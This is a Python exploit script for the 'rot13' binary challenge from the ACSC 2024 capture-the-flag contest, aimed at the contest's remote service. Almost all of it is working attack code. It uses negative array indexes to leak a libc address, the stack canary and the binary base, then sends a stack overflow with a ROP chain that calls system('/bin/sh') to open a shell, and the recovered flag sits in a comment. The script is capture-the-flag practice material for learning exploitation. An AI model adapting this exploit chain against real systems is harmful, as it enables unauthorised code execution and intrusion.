#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './rot13'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'rot13.chal.2024.ctf.acsc.asia', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
ofs_main            = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdout         = libc.symbols['_IO_2_1_stdout_']

#==========

def attack(conn, **kwargs):
    conn.sendlineafter(b'Text: ', b''.join(map(lambda x: pack(x, 'all'), range(-0x68, -0x68+0x8))))
    conn.recvuntil(b'Result: ')

    addr_libc_stdout = u64(conn.recv(8))
    libc.address = addr_libc_stdout - ofs_libc_stdout
    success('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    conn.sendlineafter(b'Text: ', b''.join(map(lambda x: pack(x, 'all'), range(-0x18, -0x18+0x18))))
    conn.recvuntil(b'Result: ')
    leak = conn.recv(0x18)

    canary      = u64(leak[0:8])
    success('canary            = 0x{:012x}'.format(canary))

    addr_stack  = u64(leak[8:8+8])
    success('addr_stack        = 0x{:012x}'.format(addr_stack))

    addr_main   = u64(leak[0x10:0x10+8]) - 0x2e5
    binf.address = addr_main - ofs_main
    success('addr_binf_base    = 0x{:012x}'.format(binf.address))

    rop = ROP(libc)
    rop.call(rop.ret)
    rop.system(addr_libc_str_sh)

    exploit  = b'a'*0x108
    exploit += flat(canary, 0xdeadbeef)
    exploit += bytes(rop)
    conn.sendlineafter(b'Text: ', exploit)
    conn.sendlineafter(b'Text: ', b'')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ACSC{aRr4y_1nd3X_sh0uLd_b3_uNs1Gn3d}

if __name__=='__main__':
    main()

#==========
